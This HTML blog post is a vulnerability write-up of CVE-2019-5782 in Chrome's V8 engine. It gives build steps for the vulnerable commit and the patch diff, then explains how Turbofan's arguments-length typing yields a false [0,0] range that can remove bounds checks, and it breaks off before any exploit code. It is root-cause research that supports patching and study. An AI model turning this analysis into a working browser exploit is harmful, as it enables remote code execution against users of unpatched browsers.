<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>CVE-2019-5782 Out-Of-Bounds V8 - Arzedlab ğŸªµ</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Incorrect optimization assumptions in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page." />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="http://localhost:1313/posts/cve-2019-5782-oob-v8-f710491993d8478483ca99402710ec07/">
  <meta property="og:site_name" content="Arzedlab ğŸªµ">
  <meta property="og:title" content="CVE-2019-5782 Out-Of-Bounds V8">
  <meta property="og:description" content="Incorrect optimization assumptions in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-12-01T13:13:13+05:00">
    <meta property="article:modified_time" content="2023-12-01T13:13:13+05:00">
    <meta property="article:tag" content="CVE-2019-5782">
    <meta property="article:tag" content="OOB">
    <meta property="article:tag" content="V8">
    <meta property="article:tag" content="Javascript">
    <meta property="article:tag" content="Turbofan">
    <meta property="article:tag" content="Compiler">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2019-5782 Out-Of-Bounds V8">
  <meta name="twitter:description" content="Incorrect optimization assumptions in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.">
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />

	
	

	
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">Arzedlab ğŸªµ</a>
	</div>
	<nav>
		
		<a href="/">ğŸ  Home</a>
		
		<a href="/posts">ğŸ—‚ï¸ All posts</a>
		
		<a href="/about">ğŸ’¡ About Me</a>
		
		<a href="/papers">ğŸ“‘ Publications</a>
		
		<a href="/tags">ğŸ·ï¸ Tags</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">CVE-2019-5782 Out-Of-Bounds V8</h1>
			<div class="meta">Posted on Dec 1, 2023</div>
		</div>
		

		
		<div class="toc">
		<strong>Table of contents:</strong>
		<nav id="TableOfContents"></nav>
		</div>

		<section class="body">
			<h1 id="cve-2019-5782--oob-v8">CVE-2019-5782 | OOB V8</h1>
<h1 id="research-done-by-ravshan-rikhsiev-2023">Research Done By <strong>Ravshan Rikhsiev</strong> (2023)</h1>
<table>
  <thead>
      <tr>
          <th><strong>Type Of Vulnerability</strong></th>
          <th><strong>Out-Of-Bounds</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Security Severity</strong></td>
          <td><strong>High</strong></td>
      </tr>
      <tr>
          <td><strong>Effected Components</strong></td>
          <td><strong>Javascript, Turbofan, Compiler</strong></td>
      </tr>
      <tr>
          <td><strong>Issue Source</strong></td>
          <td><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></td>
      </tr>
      <tr>
          <td><strong>Writeup Source(s)</strong></td>
          <td>None</td>
      </tr>
      <tr>
          <td><strong>Tested Version</strong></td>
          <td>V8 7.3.0</td>
      </tr>
      <tr>
          <td><strong>Vulnerable commit</strong></td>
          <td>18b28402118b7918512c3e5b6bc5c6f348d43564</td>
      </tr>
  </tbody>
</table>
<h1 id="building">Building</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir v8
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> v8
</span></span><span style="display:flex;"><span>fetch v8
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> v8
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Moving into vulnerable commit</span>
</span></span><span style="display:flex;"><span>git checkout 18b28402118b7918512c3e5b6bc5c6f348d43564
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Sync depot tools</span>
</span></span><span style="display:flex;"><span>gclient sync -D
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Installing dependencies </span>
</span></span><span style="display:flex;"><span>build/install-build-deps.sh
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Installing ninja to build</span>
</span></span><span style="display:flex;"><span>sudo apt install -y ninja-build
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Release and Debug versions of V8</span>
</span></span><span style="display:flex;"><span>tools/dev/gm.py x64.release; tools/dev/gm.py x64.debug
</span></span></code></pre></div><h1 id="incorrect-optimization-assumptions-in-v8"><strong>Incorrect optimization assumptions in V8</strong></h1>
<p><strong>Turbofan</strong> is an optimizing compiler in the <strong>V8</strong> JavaScript engine. It translates JavaScript code into highly optimized machine code for better performance. It uses various techniques, such as inlining functions, optimizing data types, and eliminating unnecessary operations, to generate efficient code. This helps improve the execution speed of JavaScript programs running in V8.</p>
<p>Javascript is a dynamic language, which means there can be issues with typing. For example, when evaluating an expression like <code>a + 1</code>, the type of <code>a</code> can be either a string or an integer. To optimize performance, the Turbofan optimization compiler uses assumptions to assume the type of the object.</p>
<p>An attacker can take advantage of Turbofan, manipulate them, and reach up to exploit the vulnerability.</p>
<h1 id="root-couse-of-vulnerability">Root Couse of Vulnerability</h1>
<p>The <code>kArgumentsLengthType</code> is a constant defined in the file <code>v8/src/compiler/type-cache.h</code> in the V8 source code. It is used to represent the length of arguments of the function in JavaScript.</p>
<p><strong><code>type-cache.h</code></strong>Â is a header file in the V8 source code that defines theÂ <strong><code>TypeCache</code></strong>Â class.Â This class is used to cache type feedback information for JavaScript functions, which can be used to optimize the performance of the V8 engine.Â TheÂ <strong><code>TypeCache</code></strong>Â class is used in conjunction with theÂ <strong><code>FeedbackVector</code></strong>Â class to store and retrieve type feedback information It also provides information about the range of caching. Here are some examples:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// src/compiler/type-cache.h
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>...
</span></span><span style="display:flex;"><span> Type <span style="color:#ff79c6">const</span> kInt8 <span style="color:#ff79c6">=</span> CreateRange<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">int8_t</span><span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kUint8 <span style="color:#ff79c6">=</span> CreateRange<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">uint8_t</span><span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kUint8Clamped <span style="color:#ff79c6">=</span> kUint8;
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kUint8OrMinusZeroOrNaN <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      Type<span style="color:#ff79c6">::</span>Union(kUint8, Type<span style="color:#ff79c6">::</span>MinusZeroOrNaN(), zone());
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kInt16 <span style="color:#ff79c6">=</span> CreateRange<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">int16_t</span><span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kUint16 <span style="color:#ff79c6">=</span> CreateRange<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">uint16_t</span><span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kHoleySmi <span style="color:#ff79c6">=</span> Type<span style="color:#ff79c6">::</span>Union(Type<span style="color:#ff79c6">::</span>SignedSmall(), Type<span style="color:#ff79c6">::</span>Hole(), zone());
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kAdditiveSafeInteger <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      CreateRange(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4503599627370496.0</span>, <span style="color:#bd93f9">4503599627370496.0</span>);
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kSafeInteger <span style="color:#ff79c6">=</span> CreateRange(<span style="color:#ff79c6">-</span>kMaxSafeInteger, kMaxSafeInteger);
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kAdditiveSafeIntegerOrMinusZero <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      Type<span style="color:#ff79c6">::</span>Union(kAdditiveSafeInteger, Type<span style="color:#ff79c6">::</span>MinusZero(), zone());
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kSafeIntegerOrMinusZero <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      Type<span style="color:#ff79c6">::</span>Union(kSafeInteger, Type<span style="color:#ff79c6">::</span>MinusZero(), zone());
</span></span><span style="display:flex;"><span>  Type <span style="color:#ff79c6">const</span> kPositiveSafeInteger <span style="color:#ff79c6">=</span> CreateRange(<span style="color:#bd93f9">0.0</span>, kMaxSafeInteger);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>These are just a few examples of the types defined in the <code>v8/src/compiler/type-cache.h</code> file.</p>
<p>Let&rsquo;s consider the usage of the <code>kArgumentsLengthType</code> type in process in Javascript</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> test() {
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> arguments.length;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Returns 0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">let</span> a <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Array</span>(<span style="color:#bd93f9">0x1000</span>);
</span></span><span style="display:flex;"><span>test(...a);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Returns 65536
</span></span></span></code></pre></div><p>As we can see in the code snippet, the <code>arguments.length</code> is used to determine the number of arguments passed to a JavaScript function. It is a built-in property that returns the number of arguments passed to the function.</p>
<p>For more information: <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/arguments/length">MDN web docs - arguments.length</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>diff <span style="color:#ff79c6">--</span>git a<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h b<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span>index <span style="color:#bd93f9">251</span>ea08.<span style="color:#bd93f9">.9</span>be7261 <span style="color:#bd93f9">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">---</span> a<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+++</span> b<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>compiler<span style="color:#ff79c6">/</span>type<span style="color:#ff79c6">-</span>cache.h
</span></span><span style="display:flex;"><span>@@ <span style="color:#ff79c6">-</span><span style="color:#bd93f9">166</span>,<span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span><span style="color:#bd93f9">166</span>,<span style="color:#bd93f9">7</span> @@
</span></span><span style="display:flex;"><span>       Type<span style="color:#ff79c6">::</span>Union(Type<span style="color:#ff79c6">::</span>SignedSmall(), Type<span style="color:#ff79c6">::</span>NaN(), zone());
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#6272a4">// The valid number of arguments for JavaScript functions.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">-</span>  Type <span style="color:#ff79c6">const</span> kArgumentsLengthType <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>      Type<span style="color:#ff79c6">::</span>Range(<span style="color:#bd93f9">0.0</span>, Code<span style="color:#ff79c6">::</span>kMaxArguments, zone());
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span>  Type <span style="color:#ff79c6">const</span> kArgumentsLengthType <span style="color:#ff79c6">=</span> Type<span style="color:#ff79c6">::</span>Unsigned30();
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#6272a4">// The JSArrayIterator::kind property always contains an integer in the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>   <span style="color:#6272a4">// range [0, 2], representing the possible IterationKinds.
</span></span></span></code></pre></div><p>From the patch analysis, our vulnerable code is located at:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Type <span style="color:#ff79c6">const</span> kArgumentsLengthType <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>    Type<span style="color:#ff79c6">::</span>Range(<span style="color:#bd93f9">0.0</span>, Code<span style="color:#ff79c6">::</span>kMaxArguments, zone());
</span></span></code></pre></div><p>Let&rsquo;s analyze the <code>kArgumentsLengthType</code> type, which has a range from 0.0 to <code>Code::kMaxArguments</code>, in the current zone. Before diving into the analysis, let&rsquo;s understand a little bit about <a href="https://v8.dev/blog/optimizing-v8-memory">zones</a>.</p>
<p>In V8, zones are used to manage memory allocation and deallocation. They provide a way to group related objects and allocate memory for them. Each zone has its own memory space, allowing for more efficient memory management.</p>
<ul>
<li>In addition to the JavaScript heap, V8 uses off-heap memory for internal VM operations. The largest chunk of memory is allocated through memory areas called zones. Zones are a type of region-based memory allocator which enables fast allocation and bulk deallocation where all zone-allocated memory is freed at once when the zone is destroyed. Zones are used throughout V8â€™s parser and compilers.</li>
</ul>
<p>Now, let&rsquo;s focus on analyzing the <code>kMaxArguments</code> type</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// src/objects/code.h
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>...
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">int</span> kArgumentsBits <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Reserve one argument count value as the &#34;don&#39;t adapt arguments&#34; sentinel.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">int</span> kMaxArguments <span style="color:#ff79c6">=</span> (<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> kArgumentsBits) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">2</span>;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The <code>kArgumentsBits</code> value is set to 16, which means that <code>kMaxArguments</code> will be (1 &laquo; 16 - 2 = 65536 - 2 = 65534 OR 0xFFFE). This implies that the Turbofan optimizer assumes that the maximum length of the arguments can be 65534 for optimization purposes. The <code>kArgumentsLengthType</code> represents the number of arguments to the JavaScript function, and <code>kMaxArguments</code> is set to 65534 (0xfffe). In other words, before the patch, the range of the number of function arguments was defined as from 0 to 65534 during the optimization process. Therefore, once a function is optimized, Turbofan assumes that the number of arguments for that function will never exceed 0xfffe. Thus, from Turbofan&rsquo;s perspective, the result of <code>arguments.length &gt;&gt; 16</code> is always 0.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">//Â src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>TypeÂ Typer<span style="color:#ff79c6">::</span>Visitor<span style="color:#ff79c6">::</span>JSShiftRightTyper(TypeÂ lhs,Â TypeÂ rhs,Â Typer<span style="color:#ff79c6">*</span>Â t)Â {
</span></span><span style="display:flex;"><span>Â Â <span style="color:#ff79c6">return</span>Â <span style="color:#50fa7b">BinaryNumberOpTyper</span>(lhs,Â rhs,Â t,Â NumberShiftRight);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function <code>JSShiftRightTyper()</code> is designed to optimize the shift-right operation during the Typer phase of the JavaScript optimization process. This operation involves shifting the bits of a value <code>lhs</code> to the right by a specified number of bits <code>rhs</code>. The function takes two parameters, <code>lhs</code> representing the value to be shifted and <code>rhs</code> representing the number of bits to shift.</p>
<p>Within its implementation, <code>JSShiftRightTyper()</code> utilizes the <code>BinaryNumberOpTyper()</code> function to determine and obtain the type of the result produced by the shift right operation. The result of this type inference, performed by <code>BinaryNumberOpTyper()</code>, is then returned by <code>JSShiftRightTyper()</code>.</p>
<p>In essence, <code>JSShiftRightTyper()</code> acts as a wrapper that leverages the capabilities of <code>BinaryNumberOpTyper()</code> to optimize and determine the type of the result of a shift right operation in JavaScript.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">//Â src/compiler/typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>TypeÂ Typer<span style="color:#ff79c6">::</span>Visitor<span style="color:#ff79c6">::</span>BinaryNumberOpTyper(TypeÂ lhs,Â TypeÂ rhs,Â Typer<span style="color:#ff79c6">*</span>Â t,
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â BinaryTyperFunÂ f)Â {
</span></span><span style="display:flex;"><span>Â Â lhsÂ <span style="color:#ff79c6">=</span>Â ToNumeric(lhs,Â t);
</span></span><span style="display:flex;"><span>Â Â rhsÂ <span style="color:#ff79c6">=</span>Â ToNumeric(rhs,Â t);
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">bool</span>Â lhs_is_numberÂ <span style="color:#ff79c6">=</span>Â lhs.Is(Type<span style="color:#ff79c6">::</span>Number());
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">bool</span>Â rhs_is_numberÂ <span style="color:#ff79c6">=</span>Â rhs.Is(Type<span style="color:#ff79c6">::</span>Number());
</span></span><span style="display:flex;"><span>Â Â <span style="color:#ff79c6">if</span>Â (lhs_is_numberÂ <span style="color:#ff79c6">&amp;&amp;</span>Â rhs_is_number)Â {
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#ff79c6">return</span>Â <span style="color:#50fa7b">f</span>(lhs,Â rhs,Â t);
</span></span><span style="display:flex;"><span>Â Â }
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>BinaryNumberOpTyper()</code> calls a function <code>f()</code> provided as the fourth argument when both <code>lhs</code> and <code>rhs</code> are of number types. It then returns the result of this function. Essentially, it leads to the call of <code>NumberShiftRight()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">//Â src/compiler/operation-typer.cc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>TypeÂ OperationTyper<span style="color:#ff79c6">::</span>NumberShiftRight(TypeÂ lhs,Â TypeÂ rhs)Â {
</span></span><span style="display:flex;"><span>Â Â DCHECK(lhs.Is(Type<span style="color:#ff79c6">::</span>Number()));
</span></span><span style="display:flex;"><span>Â Â DCHECK(rhs.Is(Type<span style="color:#ff79c6">::</span>Number()));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â lhsÂ <span style="color:#ff79c6">=</span>Â NumberToInt32(lhs);
</span></span><span style="display:flex;"><span>Â Â rhsÂ <span style="color:#ff79c6">=</span>Â NumberToUint32(rhs);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â <span style="color:#ff79c6">if</span>Â (lhs.IsNone()Â <span style="color:#ff79c6">||</span>Â rhs.IsNone())Â <span style="color:#ff79c6">return</span>Â Type<span style="color:#ff79c6">::</span>None();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">int32_t</span>Â min_lhsÂ <span style="color:#ff79c6">=</span>Â lhs.Min();
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">int32_t</span>Â max_lhsÂ <span style="color:#ff79c6">=</span>Â lhs.Max();
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">uint32_t</span>Â min_rhsÂ <span style="color:#ff79c6">=</span>Â rhs.Min();
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">uint32_t</span>Â max_rhsÂ <span style="color:#ff79c6">=</span>Â rhs.Max();
</span></span><span style="display:flex;"><span>Â Â <span style="color:#ff79c6">if</span>Â (max_rhsÂ <span style="color:#ff79c6">&gt;</span>Â <span style="color:#bd93f9">31</span>)Â {
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#6272a4">//Â rhsÂ canÂ beÂ largerÂ thanÂ theÂ bitmask
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Â Â Â Â max_rhsÂ <span style="color:#ff79c6">=</span>Â <span style="color:#bd93f9">31</span>;
</span></span><span style="display:flex;"><span>Â Â Â Â min_rhsÂ <span style="color:#ff79c6">=</span>Â <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>Â Â }
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">double</span>Â minÂ <span style="color:#ff79c6">=</span>Â std<span style="color:#ff79c6">::</span>min(min_lhsÂ <span style="color:#ff79c6">&gt;&gt;</span>Â min_rhs,Â min_lhsÂ <span style="color:#ff79c6">&gt;&gt;</span>Â max_rhs);
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">double</span>Â maxÂ <span style="color:#ff79c6">=</span>Â std<span style="color:#ff79c6">::</span>max(max_lhsÂ <span style="color:#ff79c6">&gt;&gt;</span>Â min_rhs,Â max_lhsÂ <span style="color:#ff79c6">&gt;&gt;</span>Â max_rhs);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Â Â <span style="color:#ff79c6">if</span>Â (maxÂ <span style="color:#ff79c6">==</span>Â kMaxIntÂ <span style="color:#ff79c6">&amp;&amp;</span>Â minÂ <span style="color:#ff79c6">==</span>Â kMinInt)Â <span style="color:#ff79c6">return</span>Â Type<span style="color:#ff79c6">::</span>Signed32();
</span></span><span style="display:flex;"><span>Â Â <span style="color:#ff79c6">return</span>Â Type<span style="color:#ff79c6">::</span>Range(min,Â max,Â zone());
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>NumberShiftRight</code>, is to handle type inference for the right shift operation (&raquo;) involving numeric types. Below is a summary of the code:</p>
<ol>
<li>The function takes two parameters, <code>lhs</code> and <code>rhs</code>, representing the left-hand and right-hand operands of the right shift operation.</li>
<li>It asserts that both <code>lhs</code> and <code>rhs</code> have the type <code>Number()</code> using <code>DCHECK</code>, which is a debug check commonly used in the V8.</li>
<li>The <code>NumberToInt32</code> and <code>NumberToUint32</code> functions are called on <code>lhs</code> and <code>rhs</code>, respectively. These functions likely convert the numeric types to 32-bit signed and unsigned integers, respectively.</li>
<li>If either the converted <code>lhs</code> or <code>rhs</code> is of type <code>None()</code>, indicating that the types are not representable as 32-bit integers, the function returns <code>Type::None()</code>.</li>
<li>The function then extracts minimum and maximum values (<code>min_lhs</code>, <code>max_lhs</code>, <code>min_rhs</code>, <code>max_rhs</code>) from the converted types.</li>
<li>There is a check to ensure that <code>max_rhs</code> does not exceed 31, as shifting by more than 31 bits is an undefined behavior in C++.</li>
<li>The code calculates the minimum and maximum values resulting from the right shift operation (<code>min_lhs &gt;&gt; min_rhs</code>, <code>min_lhs &gt;&gt; max_rhs</code>, <code>max_lhs &gt;&gt; min_rhs</code>, <code>max_lhs &gt;&gt; max_rhs</code>).  In other words (<code>0 &gt;&gt; 0</code>, <code>0 &gt;&gt; 65534</code>, <code>65534 &gt;&gt; 0</code>, <code>65534 &gt;&gt; 65534</code> ).</li>
<li>The result is then used to determine the overall type of the right shift operation. If the result range covers the entire range of 32-bit signed integers, it returns <code>Type::Signed32()</code>. Otherwise, it returns a <code>Type::Range</code> object with the calculated minimum and maximum values.</li>
</ol>
<p>In summary, when performing the operation <code>arguments.length &gt;&gt; 16</code>, where <code>kMaxArguments</code> ranges from <code>0</code> to <code>65534</code> OR <code>0xFFFE</code> and <code>16</code> is a constant value, the Right Shift resulting range from <code>NumberShiftRight()</code> will always be <code>[0, 0]</code>.</p>
<p>Because <strong>MINIMUM</strong> ( <code>0 &gt;&gt; 16 = 0</code> ) AND <strong>MAXIMUM</strong> (<code>65534 &gt;&gt; 16 = 0</code>) are both of them zero, and optimizer assumes that the maximum range is <code>[0,0]</code> , because of the minimum and maximum results and a bigger range than it is impossible by assumptions of Turbofan in the <strong>optimization process.</strong></p>
<h1 id="ok-the-range-is-zero-to-zero-is-it-a-security-issue">Ok, the range is zero to zero is it a security issue?!</h1>
<p>First of all, letâ€™s explain what is <code>VisitCheckBounds</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">//Â src/compiler/simplified-lowering.cc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>Â Â <span style="color:#8be9fd">void</span>Â <span style="color:#50fa7b">VisitCheckBounds</span>(Node<span style="color:#ff79c6">*</span>Â node,Â SimplifiedLowering<span style="color:#ff79c6">*</span>Â lowering)Â {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â <span style="color:#ff79c6">if</span>Â (lowering<span style="color:#ff79c6">-&gt;</span>poisoning_level_Â <span style="color:#ff79c6">==</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â PoisoningMitigationLevel<span style="color:#ff79c6">::</span>kDontPoisonÂ <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â (index_type.IsNone()Â <span style="color:#ff79c6">||</span>Â length_type.IsNone()Â <span style="color:#ff79c6">||</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â (index_type.Min()Â <span style="color:#ff79c6">&gt;=</span>Â <span style="color:#bd93f9">0.0</span>Â <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â index_type.Max()Â <span style="color:#ff79c6">&lt;</span>Â length_type.Min())))Â {
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â Â Â Â Â <span style="color:#6272a4">//Â TheÂ boundsÂ checkÂ isÂ redundantÂ ifÂ weÂ alreadyÂ knowÂ that
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Â Â Â Â Â Â Â Â Â Â Â Â <span style="color:#6272a4">//Â theÂ indexÂ isÂ withinÂ theÂ boundsÂ ofÂ [0.0,Â length[.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Â Â Â Â Â Â Â Â Â Â Â Â DeferReplacement(node,Â node<span style="color:#ff79c6">-&gt;</span>InputAt(<span style="color:#bd93f9">0</span>));
</span></span><span style="display:flex;"><span>...
